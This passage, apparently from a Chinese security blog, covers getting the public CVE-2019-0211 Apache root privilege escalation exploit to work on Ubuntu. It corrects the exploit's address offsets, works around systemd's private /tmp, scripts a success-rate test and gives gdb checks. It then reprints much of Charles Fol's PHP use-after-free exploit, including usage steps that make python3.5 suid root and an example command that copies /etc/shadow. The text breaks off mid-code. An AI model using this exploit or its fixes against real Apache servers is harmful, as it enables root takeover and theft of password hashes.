    <span class="cm"> * multiple Listen statements.  Define SINGLE_LISTEN_UNSERIALIZED_ACCEPT</span>
    <span class="cm"> * when it's safe in the single Listen case.</span>
    <span class="cm"> */</span>
    <span class="cp">#ifdef SINGLE_LISTEN_UNSERIALIZED_ACCEPT</span>
    <span class="cp">#define SAFE_ACCEPT(stmt) (ap_listeners-&gt;next ? (stmt) : APR_SUCCESS)</span>
    <span class="cp">#else</span>
    <span class="cp">#define SAFE_ACCEPT(stmt) (stmt)</span>
    <span class="cp">#endif</span></p>
<p>简单的来说，只有在apache开启多个端口的情况下，才会生成mutex互斥锁，而在github上公布的exp就是通过apache的mutex对象来进行利用的。</p>
<h3 id="exp_1">跑exp中遇到的一些坑<a class="headerlink" href="#exp_1" title="Permanent link">&para;</a></h3>
<p>我试过了很多版本，没有一个版本是能直接使用Github上的exp的，在上述表面的版本中，经过调试研究发现了两个问题导致了利用失败：</p>
<ol>
<li>
<p><code>$all_buckets = $i - 0x10</code> 计算出问题</p>
</li>
<li>
<p><code>$bucket_index = $bucket_index_middle - (int) ($total_nb_buckets / 2);</code>
    计算出问题</p>
</li>
</ol>
<p>第一个计算<code>all_buckets</code>的地址，使用gdb进行调试，你会发现，这个值并没有算错，但是在执行<code>apache2ctl graceful</code>命令以后，<code>all_buckets</code>
生成了一个新的值，不过只和之前的<code>all_buckets</code>地址差<code>0x38000</code>，所以这个问题很好解决：</p>
<div class="codehilite"><pre><span></span><code><span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;x&quot;</span><span class="nt">&gt;</span>$all_buckets<span class="w"> </span>=<span class="w"> </span>$i<span class="w"> </span>-<span class="w"> </span>0x10<span class="w"> </span>+<span class="w"> </span>0x38000;<span class="nt">&lt;/span&gt;</span>
</code></pre></div>

<p>第二个计算没必要这么复杂，而且在我测试的版本中还是算的错误的地址，直接改成：</p>
<div class="codehilite"><pre><span></span><code><span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;x&quot;</span><span class="nt">&gt;</span>$bucket_index<span class="w"> </span>=<span class="w"> </span>$bucket_index_middle;<span class="nt">&lt;/span&gt;</span>
</code></pre></div>

<h3 id="ubuntu">ubuntu中的一个坑<a class="headerlink" href="#ubuntu" title="Permanent link">&para;</a></h3>
<p>我的payload是：<code>curl "http://www.0-sec.org/cfreal-carpediem.php?cmd=id&gt;/tmp/2323232"</code></p>
<p>表面上看是执行成功了，但是却并没有在/tmp目录下发现2323232文件，经过随后的研究发现，systemd重定向了apache的tmp目录，执行下<code>$find /tmp -name "2323232"</code>就找到文件了，不过只有root用户能访问。如果不想让systemd重定向tmp目录也简单：</p>
<div class="codehilite"><pre><span></span><code>$<span class="w"> </span>cat<span class="w"> </span>/lib/systemd/system/apache2.service<span class="w"> </span>
<span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;o&quot;</span><span class="nt">&gt;</span>[<span class="nt">&lt;/span&gt;</span>Unit<span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;o&quot;</span><span class="nt">&gt;</span>]<span class="nt">&lt;/span&gt;</span>
<span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;nv&quot;</span><span class="nt">&gt;</span>Description<span class="nt">&lt;/span&gt;&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;o&quot;</span><span class="nt">&gt;</span>=<span class="nt">&lt;/span&gt;</span>The<span class="w"> </span>Apache<span class="w"> </span>HTTP<span class="w"> </span>Server
<span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;nv&quot;</span><span class="nt">&gt;</span>After<span class="nt">&lt;/span&gt;&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;o&quot;</span><span class="nt">&gt;</span>=<span class="nt">&lt;/span&gt;</span>network.target<span class="w"> </span>remote-fs.target<span class="w"> </span>nss-lookup.target

<span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;o&quot;</span><span class="nt">&gt;</span>[<span class="nt">&lt;/span&gt;</span>Service<span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;o&quot;</span><span class="nt">&gt;</span>]<span class="nt">&lt;/span&gt;</span>
<span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;nv&quot;</span><span class="nt">&gt;</span>Type<span class="nt">&lt;/span&gt;&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;o&quot;</span><span class="nt">&gt;</span>=<span class="nt">&lt;/span&gt;</span>forking
<span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;nv&quot;</span><span class="nt">&gt;</span>Environment<span class="nt">&lt;/span&gt;&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;o&quot;</span><span class="nt">&gt;</span>=<span class="nt">&lt;/span&gt;&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;nv&quot;</span><span class="nt">&gt;</span>APACHE_STARTED_BY_SYSTEMD<span class="nt">&lt;/span&gt;&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;o&quot;</span><span class="nt">&gt;</span>=<span class="nt">&lt;/span&gt;&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;nb&quot;</span><span class="nt">&gt;</span>true<span class="nt">&lt;/span&gt;</span>
<span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;nv&quot;</span><span class="nt">&gt;</span>ExecStart<span class="nt">&lt;/span&gt;&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;o&quot;</span><span class="nt">&gt;</span>=<span class="nt">&lt;/span&gt;</span>/usr/sbin/apachectl<span class="w"> </span>start
<span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;nv&quot;</span><span class="nt">&gt;</span>ExecStop<span class="nt">&lt;/span&gt;&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;o&quot;</span><span class="nt">&gt;</span>=<span class="nt">&lt;/span&gt;</span>/usr/sbin/apachectl<span class="w"> </span>stop
<span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;nv&quot;</span><span class="nt">&gt;</span>ExecReload<span class="nt">&lt;/span&gt;&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;o&quot;</span><span class="nt">&gt;</span>=<span class="nt">&lt;/span&gt;</span>/usr/sbin/apachectl<span class="w"> </span>graceful
<span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;nv&quot;</span><span class="nt">&gt;</span>PrivateTmp<span class="nt">&lt;/span&gt;&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;o&quot;</span><span class="nt">&gt;</span>=<span class="nt">&lt;/span&gt;&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;nb&quot;</span><span class="nt">&gt;</span>false<span class="nt">&lt;/span&gt;</span>
<span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;nv&quot;</span><span class="nt">&gt;</span>Restart<span class="nt">&lt;/span&gt;&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;o&quot;</span><span class="nt">&gt;</span>=<span class="nt">&lt;/span&gt;</span>on-abort

<span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;o&quot;</span><span class="nt">&gt;</span>[<span class="nt">&lt;/span&gt;</span>Install<span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;o&quot;</span><span class="nt">&gt;</span>]<span class="nt">&lt;/span&gt;</span>
<span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;nv&quot;</span><span class="nt">&gt;</span>WantedBy<span class="nt">&lt;/span&gt;&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;o&quot;</span><span class="nt">&gt;</span>=<span class="nt">&lt;/span&gt;</span>multi-user.target
</code></pre></div>

<h3 id="_14">关于成功率的说法<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h3>
<p>在exp的注释中看到了说该利用没法100%成功，有失败的概率，所以我写了个脚本进行测试：</p>
<div class="codehilite"><pre><span></span><code><span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;c1&quot;</span><span class="nt">&gt;</span>#!/bin/bash<span class="nt">&lt;/span&gt;</span>

<span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;nv&quot;</span><span class="nt">&gt;</span>SUCC<span class="nt">&lt;/span&gt;&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;o&quot;</span><span class="nt">&gt;</span>=<span class="nt">&lt;/span&gt;&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;m&quot;</span><span class="nt">&gt;</span>0<span class="nt">&lt;/span&gt;</span>
<span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;nv&quot;</span><span class="nt">&gt;</span>COUNT<span class="nt">&lt;/span&gt;&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;o&quot;</span><span class="nt">&gt;</span>=<span class="nt">&lt;/span&gt;&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;m&quot;</span><span class="nt">&gt;</span>0<span class="nt">&lt;/span&gt;</span>
<span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;k&quot;</span><span class="nt">&gt;</span>for<span class="nt">&lt;/span&gt;</span><span class="w"> </span>i<span class="w"> </span>in<span class="w"> </span><span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;k&quot;</span><span class="nt">&gt;</span>$(<span class="nt">&lt;/span&gt;</span>seq<span class="w"> </span><span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;m&quot;</span><span class="nt">&gt;</span>1<span class="nt">&lt;/span&gt;</span><span class="w"> </span><span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;m&quot;</span><span class="nt">&gt;</span>20<span class="nt">&lt;/span&gt;&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;k&quot;</span><span class="nt">&gt;</span>)<span class="nt">&lt;/span&gt;</span>
<span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;k&quot;</span><span class="nt">&gt;</span>do<span class="nt">&lt;/span&gt;</span>
<span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;nb&quot;</span><span class="nt">&gt;</span>let<span class="nt">&lt;/span&gt;</span><span class="w"> </span><span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;nv&quot;</span><span class="nt">&gt;</span>COUNT<span class="nt">&lt;/span&gt;&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;o&quot;</span><span class="nt">&gt;</span>+=<span class="nt">&lt;/span&gt;&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;m&quot;</span><span class="nt">&gt;</span>1<span class="nt">&lt;/span&gt;</span>
/etc/init.d/apache2<span class="w"> </span>stop
sleep<span class="w"> </span><span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;m&quot;</span><span class="nt">&gt;</span>1<span class="nt">&lt;/span&gt;</span>
/etc/init.d/apache2<span class="w"> </span>start
<span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;k&quot;</span><span class="nt">&gt;</span>if<span class="nt">&lt;/span&gt;</span><span class="w"> </span><span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;o&quot;</span><span class="nt">&gt;</span>[<span class="nt">&lt;/span&gt;</span><span class="w"> </span>-f<span class="w"> </span><span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;s2&quot;</span><span class="nt">&gt;</span>&quot;/tmp/1982347&quot;<span class="nt">&lt;/span&gt;</span><span class="w"> </span><span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;o&quot;</span><span class="nt">&gt;</span>]<span class="nt">&lt;/span&gt;&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;p&quot;</span><span class="nt">&gt;</span>;<span class="nt">&lt;/span&gt;&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;k&quot;</span><span class="nt">&gt;</span>then<span class="nt">&lt;/span&gt;</span>
<span class="w">    </span>rm<span class="w"> </span>/tmp/1982347
<span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;k&quot;</span><span class="nt">&gt;</span>fi<span class="nt">&lt;/span&gt;</span>
curl<span class="w"> </span><span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;s2&quot;</span><span class="nt">&gt;</span>&quot;http://localhost/cfreal-carpediem.php?cmd=id<span class="ni">&amp;gt;</span>/tmp/1982347&quot;<span class="nt">&lt;/span&gt;</span>

apache2ctl<span class="w"> </span>graceful

sleep<span class="w"> </span><span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;m&quot;</span><span class="nt">&gt;</span>1<span class="nt">&lt;/span&gt;</span>

<span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;k&quot;</span><span class="nt">&gt;</span>if<span class="nt">&lt;/span&gt;</span><span class="w"> </span><span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;o&quot;</span><span class="nt">&gt;</span>[<span class="nt">&lt;/span&gt;</span><span class="w"> </span>-f<span class="w"> </span><span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;s2&quot;</span><span class="nt">&gt;</span>&quot;/tmp/1982347&quot;<span class="nt">&lt;/span&gt;</span><span class="w"> </span><span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;o&quot;</span><span class="nt">&gt;</span>]<span class="nt">&lt;/span&gt;&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;p&quot;</span><span class="nt">&gt;</span>;<span class="nt">&lt;/span&gt;&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;k&quot;</span><span class="nt">&gt;</span>then<span class="nt">&lt;/span&gt;</span>
<span class="w">    </span><span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;nb&quot;</span><span class="nt">&gt;</span>let<span class="nt">&lt;/span&gt;</span><span class="w"> </span><span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;nv&quot;</span><span class="nt">&gt;</span>SUCC<span class="nt">&lt;/span&gt;&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;o&quot;</span><span class="nt">&gt;</span>+=<span class="nt">&lt;/span&gt;&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;m&quot;</span><span class="nt">&gt;</span>1<span class="nt">&lt;/span&gt;</span>
<span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;k&quot;</span><span class="nt">&gt;</span>fi<span class="nt">&lt;/span&gt;</span>

<span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;k&quot;</span><span class="nt">&gt;</span>done<span class="nt">&lt;/span&gt;</span>

<span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;nb&quot;</span><span class="nt">&gt;</span>echo<span class="nt">&lt;/span&gt;</span><span class="w"> </span><span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;s2&quot;</span><span class="nt">&gt;</span>&quot;COUNT:<span class="w"> </span><span class="nt">&lt;/span&gt;&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;nv&quot;</span><span class="nt">&gt;</span>$COUNT<span class="nt">&lt;/span&gt;&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;s2&quot;</span><span class="nt">&gt;</span>&quot;<span class="nt">&lt;/span&gt;</span>
<span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;nb&quot;</span><span class="nt">&gt;</span>echo<span class="nt">&lt;/span&gt;</span><span class="w"> </span><span class="nt">&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;s2&quot;</span><span class="nt">&gt;</span>&quot;SUCCESS:<span class="w"> </span><span class="nt">&lt;/span&gt;&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;nv&quot;</span><span class="nt">&gt;</span>$SUCC<span class="nt">&lt;/span&gt;&lt;span</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;s2&quot;</span><span class="nt">&gt;</span>&quot;<span class="nt">&lt;/span&gt;</span>
</code></pre></div>

<h3 id="_15">总结<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h3>
<p>其他版本的还没有进行测试，但是在这里给一些建议。</p>
<ol>
<li>
<p>check all_buckets地址</p>
</li>
<li>
<p>这个挺简单的，执行完exp以后，有输出对应的pid和all_buckets地址，可以使用gdb
    attach上去检查下该地址是否正确：<code>p all_buckets</code></p>
<p>PS：这里要注意下，需要安装dbg包，才有all_buckets符号
：<code>apt install apache2-dbg=2.4.29-1ubuntu4</code></p>
<p>如果有问题，就调试检查exp中搜索all_buckets地址的流程</p>
<p>如果没问题，就使用gdb
attach主进程(root权限的那个进程)，然后断点下在<code>make_child</code>，然后执行<code>apache2ctl graceful</code>，执行完然后在gdb的流程跳到make_child函数的时候，再输出一次：<code>p all_buckets</code>，和exp获取的值对比一下，如果一样就没问题了</p>
</li>
<li>
<p>check my_bucket地址</p>
</li>
<li>
<p>前面的流程和上面一样，重点关注在make_child函数中的my_bucket赋值的代码：<a href="https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L691">3</a></p>
<p>这里注意下，因为上面有一个fork，所以在gdb里还要加一句：<code>set follow-fork-mode child</code></p>
<p><code>my_bucket</code>的值是一个指针，指向堆喷的地址，如果<code>my_bucket</code>的值没问题，exp基本就没问题了，如果不对，就调整<code>$bucket_index</code></p>
</li>
</ol>
<h3 id="poc-2">poc 2<a class="headerlink" href="#poc-2" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><code><span class="s">&lt;?php</span>
<span class="s"># CARPE (DIEM): CVE-2019-0211 Apache Root Privilege Escalation</span>
<span class="s"># Charles Fol</span>
<span class="s"># @cfreal_</span>
<span class="s"># 2019-04-08</span>
<span class="s">#</span>
<span class="s"># INFOS</span>
<span class="s">#</span>
<span class="s"># https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html</span>
<span class="s">#</span>
<span class="s"># USAGE</span>
<span class="s">#</span>
<span class="s"># 1. Upload exploit to Apache HTTP server</span>
<span class="s"># 2. Send request to page</span>
<span class="s"># 3. Await 6:25AM for logrotate to restart Apache</span>
<span class="s"># 4. python3.5 is now suid 0</span>
<span class="s">#</span>
<span class="s"># You can change the command that is ran as root using the cmd HTTP</span>
<span class="s"># parameter (GET/POST).</span>
<span class="s"># Example: curl http://localhost/carpediem.php?cmd=cp+/etc/shadow+/tmp/</span>
<span class="s">#</span>
<span class="s"># SUCCESS RATE</span>
<span class="s">#</span>
<span class="s"># Number of successful and failed exploitations relative to of the number</span>
<span class="s"># of MPM workers (i.e. Apache subprocesses). YMMV.</span>
<span class="s">#</span>
<span class="s"># W  --% S   F</span>
<span class="s">#  5 87% 177 26 (default)</span>
<span class="s">#  8 89%  60  8</span>
<span class="s"># 10 95%  70  4</span>
<span class="s">#</span>
<span class="s"># More workers, higher success rate.</span>
<span class="s"># By default (5 workers), 87% success rate. With huge HTTPds, close to 100%.</span>
<span class="s"># Generally, failure is due to all_buckets being relocated too far from its</span>
<span class="s"># original address.</span>
<span class="s">#</span>
<span class="s"># TESTED ON</span>
<span class="s">#</span>
<span class="s"># - Apache/2.4.25</span>
<span class="s"># - PHP 7.2.12</span>
<span class="s"># - Debian GNU/Linux 9.6</span>
<span class="s">#</span>
<span class="s"># TESTING</span>
<span class="s">#</span>
<span class="s"># $ curl http://localhost/cfreal-carpediem.php</span>
<span class="s"># $ sudo /usr/sbin/logrotate /etc/logrotate.conf --force</span>
<span class="s"># $ ls -alh /usr/bin/python3.5</span>
<span class="s"># -rwsr-sr-x 2 root root 4.6M Sep 27  2018 /usr/bin/python3.5</span>
<span class="s">#</span>
<span class="s"># There are no hardcoded addresses.</span>
<span class="s"># - Addresses read through /proc/self/mem</span>
<span class="s"># - Offsets read through ELF parsing</span>
<span class="s">#</span>
<span class="s"># As usual, there are tons of comments.</span>
<span class="s">#</span>


<span class="s">o(&#39;CARPE (DIEM) ~ CVE-2019-0211&#39;);</span>
<span class="s">o(&#39;&#39;);</span>

<span class="s">error_reporting(E_ALL);</span>


<span class="s"># Starts the exploit by triggering the UAF.</span>
<span class="s">function real()</span>
<span class="s">{</span>
<span class="s">    global $y;</span>
<span class="s">    $y = [new Z()];</span>
<span class="s">    json_encode([0 =&gt;</span> &amp;<span class="nv">$y</span>]);
}

<span class="c1"># In order to read/write what comes after in memory, we need to UAF a string so</span>
<span class="c1"># that we can control its size and make in-place edition.</span>
<span class="c1"># An easy way to do that is to replace the string by a timelib_rel_time</span>
<span class="c1"># structure of which the first bytes can be reached by the (y, m, d, h, i, s)</span>
<span class="c1"># properties of the DateInterval object.</span>
<span class="c1">#</span>
<span class="c1"># Steps:</span>
<span class="c1"># - Create a base object (Z)</span>
<span class="c1"># - Add string property (abc) so that sizeof(abc) = sizeof(timelib_rel_time)</span>
<span class="c1"># - Create DateInterval object ($place) meant to be unset and filled by another</span>
<span class="c1"># - Trigger the UAF by unsetting $y[0], which is still reachable using $this</span>
<span class="c1"># - Unset $place: at this point, if we create a new DateInterval object, it will</span>
<span class="c1">#   replace $place in memory</span>
<span class="c1"># - Create a string ($holder) that fills $place&#39;s timelib_rel_time structure</span>
<span class="c1"># - Allocate a new DateInterval object: its timelib_rel_time structure will</span>
<span class="c1">#   end up in place of abc</span>
<span class="c1"># - Now we can control $this-&gt;abc&#39;s zend_string structure entirely using</span>
<span class="c1">#   y, m, d etc.</span>
<span class="c1"># - Increase abc&#39;s size so that we can read/write memory that comes after it,</span>
<span class="c1">#   especially the shared memory block</span>
<span class="c1"># - Find out all_buckets&#39; position by finding a memory region that matches the</span>
<span class="c1">#   mutex-&gt;meth structure</span>
<span class="c1"># - Compute the bucket index required to reach the SHM and get an arbitrary</span>
<span class="c1">#   function call</span>
<span class="c1"># - Scan ap_scoreboard_image-&gt;parent[] to find workers&#39; PID and replace the</span>
<span class="c1">#   bucket</span>
<span class="k">class</span> <span class="o">Z</span> <span class="n">implements</span> <span class="n">JsonSerializable</span>
{
    <span class="n">public</span> <span class="n">function</span> <span class="n">jsonSerialize</span>()
    {
        <span class="n">global</span> <span class="nv">$y</span>, <span class="nv">$addresses</span>, <span class="nv">$workers_pids</span>;

        <span class="c1">#</span>
        <span class="c1"># Setup memory</span>
        <span class="c1">#</span>
        <span class="n">o</span>(<span class="s">&#39;Triggering UAF&#39;</span>);
        <span class="n">o</span>(<span class="s">&#39;  Creating room and filling empty spaces&#39;</span>);

        <span class="c1"># Fill empty blocks to make sure our allocations will be contiguous</span>
        <span class="c1"># I: Since a lot of allocations/deallocations happen before the script</span>
        <span class="c1"># is ran, two variables instanciated at the same time might not be</span>
        <span class="c1"># contiguous: this can be a problem for a lot of reasons.</span>
        <span class="c1"># To avoid this, we instanciate several DateInterval objects. These</span>
        <span class="c1"># objects will fill a lot of potentially non-contiguous memory blocks,</span>
        <span class="c1"># ensuring we get &quot;fresh memory&quot; in upcoming allocations.</span>
        <span class="nv">$contiguous</span> = [];
        <span class="k">for</span>(<span class="nv">$i</span>=<span class="mi">0</span>;<span class="nv">$i&lt;10;$i++)</span>
<span class="nv">            $contiguous[] = new DateInterval(&#39;PT1S&#39;);</span>

<span class="nv">        # Create some space for our UAF blocks not to get overwritten</span>
<span class="nv">        # I: A PHP object is a combination of a lot of structures, such as</span>
<span class="nv">        # zval, zend_object, zend_object_handlers, zend_string, etc., which are</span>
<span class="nv">        # all allocated, and freed when the object is destroyed.</span>
<span class="nv">        # After the UAF is triggered on the object, all the structures that are</span>
<span class="nv">        # used to represent it will be marked as free.</span>
<span class="nv">        # If we create other variables afterwards, those variables might be</span>
<span class="nv">        # allocated in the object&#39;s previous memory regions, which might pose</span>
<span class="nv">        # problems for the rest of the exploitation.</span>
<span class="nv">        # To avoid this, we allocate a lot of objects before the UAF, and free</span>
<span class="nv">        # them afterwards. Since PHP&#39;s heap is LIFO, when we create other vars,</span>
<span class="nv">        # they will take the place of those objects instead of the object we</span>
<span class="nv">        # are triggering the UAF on. This means our object is &quot;shielded&quot; and</span>
<span class="nv">        # we don&#39;t have to worry about breaking it.</span>
<span class="nv">        $room = [];</span>
<span class="nv">        for($i=0;$i&lt;10;$i++)</span>
<span class="nv">            $room[] = new Z();</span>

<span class="nv">        # Build string meant to fill old DateInterval&#39;s timelib_rel_time</span>
<span class="nv">        # I: ptr2str&#39;s name is unintuitive here: we just want to allocate a</span>
<span class="nv">        # zend_string of size 78.</span>
<span class="nv">        $_protector = ptr2str(0, 78);</span>

<span class="nv">        o(&#39;  Allocating $abc and $p&#39;);</span>

<span class="nv">        # Create ABC</span>
<span class="nv">        # I: This is the variable we will use to R/W memory afterwards.</span>
<span class="nv">        # After we free the Z object, we&#39;ll make sure abc is overwritten by a</span>
<span class="nv">        # timelib_rel_time structure under our control. The first 8*8 = 64 bytes</span>
<span class="nv">        # of this structure can be modified easily, meaning we can change the</span>
<span class="nv">        # size of abc. This will allow us to read/write memory after abc.</span>
<span class="nv">        $this-&gt;</span><span class="n">abc</span> = <span class="n">ptr2str</span>(<span class="mi">0</span>, <span class="mi">79</span>);

        <span class="c1"># Create $p meant to protect $this&#39;s blocks</span>
        <span class="c1"># I: Right after we trigger the UAF, we will unset $p.</span>
        <span class="c1"># This means that the timelib_rel_time structure (TRT) of this object</span>
        <span class="c1"># will be freed. We will then allocate a string ($protector) of the same</span>
        <span class="c1"># size as TRT. Since PHP&#39;s heap is LIFO, the string will take the place</span>
        <span class="c1"># of the now-freed TRT in memory.</span>
        <span class="c1"># Then, we create a new DateInterval object ($x). From the same</span>
        <span class="c1"># assumption, every structure constituting this new object will take the</span>
        <span class="c1"># place of the previous structure. Nevertheless, since TRT&#39;s memory</span>
        <span class="c1"># block has already been replaced by $protector, the new TRT will be put</span>
        <span class="c1"># in the next free blocks of the same size, which happens to be $abc</span>
        <span class="c1"># (remember, |abc| == |timelib_rel_time|).</span>
        <span class="c1"># We now have the following situation: $x is a DateInterval object whose</span>
        <span class="c1"># internal TRT structure has the same address as $abc&#39;s zend_string.</span>
        <span class="nv">$p</span> = <span class="nb">new</span> <span class="n">DateInterval</span>(<span class="s">&#39;PT1S&#39;</span>);

        <span class="c1">#</span>
        <span class="c1"># Trigger UAF</span>
        <span class="c1">#</span>

        <span class="n">o</span>(<span class="s">&#39;  Unsetting both variables and setting $protector&#39;</span>);
        <span class="c1"># UAF here, $this is usable despite being freed</span>
        <span class="n">unset</span>(<span class="nv">$y</span>[<span class="mi">0</span>]);
        <span class="c1"># Protect $this&#39;s freed blocks</span>
        <span class="n">unset</span>(<span class="nv">$p</span>);

        <span class="c1"># Protect $p&#39;s timelib_rel_time structure</span>
        <span class="nv">$protector</span> = <span class="s">&quot;.$_protector&quot;</span>;
        <span class="c1"># !!! This is only required for apache</span>
        <span class="c1"># Got no idea as to why there is an extra deallocation (?)</span>
        <span class="k">if</span>(<span class="n">version_compare</span>(<span class="n">PHP_VERSION</span>, <span class="s">&#39;7.2&#39;</span>) &gt;= <span class="mi">0</span>)
                    <span class="nv">$room</span>[] = <span class="s">&quot;!$_protector&quot;</span>;

        <span class="n">o</span>(<span class="s">&#39;  Creating DateInterval object&#39;</span>);
        <span class="c1"># After this line:</span>
        <span class="c1"># &amp;((php_interval_obj) x).timelib_rel_time == ((zval) abc).value.str</span>
        <span class="c1"># We can control the structure of $this-&gt;abc and therefore read/write</span>
        <span class="c1"># anything that comes after it in memory by changing its size and</span>
        <span class="c1"># making in-place edits using $this-&gt;abc[$position] = $char</span>
        <span class="nv">$x</span> = <span class="nb">new</span> <span class="n">DateInterval</span>(<span class="s">&#39;PT1S&#39;</span>);
        <span class="c1"># zend_string.refcount = 0</span>
        <span class="c1"># It will get incremented at some point, and if it is &gt; 1,</span>
        <span class="c1"># zend_assign_to_string_offset() will try to duplicate it before making</span>
        <span class="c1"># the in-place replacement</span>
        <span class="nv">$x-</span>&gt;<span class="n">y</span> = <span class="mh">0x00</span>;
        <span class="c1"># zend_string.len</span>
        <span class="nv">$x-</span>&gt;<span class="nb">d</span> = <span class="mh">0x100</span>;
        <span class="c1"># zend_string.val[0-4]</span>
        <span class="nv">$x-</span>&gt;<span class="n">h</span> = <span class="mh">0x13121110</span>;

        <span class="c1"># Verify UAF was successful</span>
        <span class="c1"># We modified stuff via $x; they should be visible by $this-&gt;abc, since</span>
        <span class="c1"># they are at the same memory location.</span>
        <span class="k">if</span>(!(
            <span class="n">strlen</span>(<span class="nv">$this-</span>&gt;<span class="n">abc</span>) === <span class="nv">$x-</span>&gt;<span class="nb">d</span> &amp;&amp;
            <span class="nv">$this-</span>&gt;<span class="n">abc</span>[<span class="mi">0</span>] == <span class="s">&quot;\x10&quot;</span> &amp;&amp;
            <span class="nv">$this-</span>&gt;<span class="n">abc</span>[<span class="mi">1</span>] == <span class="s">&quot;\x11&quot;</span> &amp;&amp;
